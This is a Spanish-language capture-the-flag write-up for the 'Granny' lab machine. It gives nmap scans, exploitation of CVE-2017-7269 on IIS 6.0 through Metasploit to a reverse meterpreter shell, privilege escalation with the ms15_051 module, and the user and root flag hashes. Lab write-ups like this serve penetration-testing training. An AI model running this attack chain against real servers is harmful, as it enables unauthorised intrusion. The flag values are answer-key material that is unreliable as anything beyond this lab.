
![[ 20250720125841.png]](granny-images/20250720125841.png)

# NMAP

primero realizamos un escaneo básico de nmap

```bash
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.182.8 -oG allPorts
```

ahora realizamos un segundo escaneo con scripts básicos de nmap para sacar servicios y puertos

```bash 
nmap -p80 -sCV 10.129.182.8 -oN targeted
```

![[ 20250720130200.png]](granny-images/20250720130200.png)

aqui vemos el servicio y version del puerto 80 en este caso `Microsoft IIS httpd 6.0`

buscamos en google para ver que encontramos 

![[ 20250720130254.png]](granny-images/20250720130254.png)

aqui podemos ver que la maquina es vulnerable al  `CVE-2017-7269`

por lo que vamos a tratar de explotar la vulnerabilidad con metasploit

# metasploit

abrimos la terminal de metasploit 

```bash
msfdb run
```

hacemos una busqueda de exploits con la vulnerabilidad

```bash
search CVE-2017-7269
```

![[ 20250720130510.png]](granny-images/20250720130510.png)

utilizamos el exploit encontrado

```bash
use 0
```

vamos a cambiar las opciones 

```bash
options
```

-  RHOSTS - IP VCTIMA
- LHOST - NUESTRA IP
- (OPCIONAL) LPORT - PUERTO A ELEGIR DE NUESTO SISTEMA 
	-hay veces que los sistemas bloquean el puerto 4444 que es el que usa metasploit por defecto por lo que a veces es mejor cambiarlo

```bash
set PARAMETRO DATA
```

EJEMPLO:

```bash
set RHOSTS 10.129.182.8
```

y lanzamos el exploit 

```bash
epxloit
```

![[ 20250720130753.png]](granny-images/20250720130753.png)

conseguimos shell como meterpreter

Al tratar de entrar en la carpeta de administrador vemos que no tenemos permisos

![[ 20250720130822.png]](granny-images/20250720130822.png)

# escalada de privilegios

Tenemos que migrar hacia un servicio que nos de permisos de administrador.

Lo primero que haremos será tratar de conseguir una ruta de escalada de privilegios lo haremos usando la herramienta 

```bash
run post/multi/recon/local_exploit_suggester 
```

Esta herramienta hará un escaneo de vulnerabilidades para escalada de privilegios en el localhosts de la maquina victima

![[ 20250720131113.png]](granny-images/20250720131113.png)

aqui nos sugiere utilizar algunos exploits 

para poder utilizarlos tendremos que migrar a algún servicio con permisos para ello utilizaremos `ps` para ver que servicios están activos

```bash
ps
```

![[ 20250720131527.png]](granny-images/20250720131527.png)

en mi caso utilizare este con ID 1896

para migrar haremos el comando:

```bash
migrate 1896
```

realizaremos un background para dejar la sesion suspendida y poder utilizarla después

```bash
background
```

En la maquina grandpa que tiene la misma vulnerabilidad utilizamos el modulo `exploit/windows/local/ms14_070_tcpip_ioctl `
para cambiar un poco y ver como de funcionales son el resto de módulos en esta maquina utilizaremos el `exploit/windows/local/ms15_051_client_copy_image`
ambos módulos funcionan por lo que la elección de uno u otro es por preferencia del usuario en este caso. en otros casos puede que solo funcione uno por lo que debemos probar con todos los módulos recomendados hasta que uno sea efectivo

 ```bash
 use exploit/windows/local/ms15_051_client_copy_image
```

cambiamos los parámetros

-  RHOSTS - IP VCTIMA
-  SESSION - Sesion de meterpreter suspendida si habéis seguido los pasos será la numero 1
```bash
set SESSION 1
```


lanzamos el exploit

```bash
exploit
```

![[ 20250720132103.png]](granny-images/20250720132103.png)

y obtenemos meterpreter con privilegios

# Flags

## User 

![[ 20250720132212.png]](granny-images/20250720132212.png)

la flag esta en el directorio : C:\Documents and Settings\Lakis\Desktop

user : 700c5dc163014e22b3e408f8703f67d1

## Root

![[ 20250720132305.png]](granny-images/20250720132305.png)

la flag esta en el directorio : C:\Documents and Settings\Administrator\Desktop

root : aa4beed1c0584445ab463a6747bd06e9
